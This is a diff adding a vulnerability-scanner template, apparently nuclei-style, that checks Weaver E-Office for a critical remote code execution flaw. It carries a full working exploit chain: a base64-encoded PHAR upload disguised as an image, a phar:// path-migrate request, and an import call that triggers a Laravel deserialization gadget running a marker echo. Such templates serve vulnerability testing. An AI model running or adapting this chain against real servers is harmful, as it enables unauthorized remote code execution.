@@ -1,0 +1,64 @@
+id: weaver-weaver-e-office-rce
+info:
+  name: 泛微 E-Office - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 3
+    vuln-id: CT-1156977
+    vendor: weaver
+    product: e-office
+  tags: deserialization,vuln,weaver,e-office
+variables:
+  boundary: '{{to_lower(rand_text_alpha(8))}}'
+  payload: '{{base64_decode("R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpEAQAAAQAAABEAAAABAAAAAAAOAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Mzc6ImVjaG8gOXlNODZFU3lGQlhORHdDaDZOYnN4eTl3cmNRclAyNVAiO319CAAAAHRlc3QudHh0BAAAAEvbA2YEAAAADH5/2KQBAAAAAAAAdGVzdIEpwGmDhmYzxumoAjJwcaz4EdU+AgAAAEdCTUI=")}}'
+flow: http(1) && http(2) && http(3)
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/eoffice10/server/public/api/attachment/atuh-file'
+  headers:
+    Content-Type: multipart/form-data; boundary={{boundary}}
+    Accept-Encoding: gzip, deflate
+    Accept: string("*/*")
+  body: |-
+    --{{boundary}}
+    Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+    Content-Type: image/jpeg
+
+    {{payload}}
+    --{{boundary}}--
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, ''attachment_id'')'
+    internal: true
+  extractors:
+  - type: regex
+    name: attachment_id
+    part: body
+    group: 1
+    regex:
+    - '"attachment_id":"(.+?)"'
+    internal: true
+- method: POST
+  path:
+  - '{{BaseURL}}/eoffice10/server/public/api/attachment/path/migrate'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, ''"status":1'')'
+- method: POST
+  path:
+  - '{{BaseURL}}/eoffice10/server/public/api/empower/import'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: type=tttt&file={{attachment_id}}
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, ''9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P'') && contains(body, ''"code":"no_file"'')'
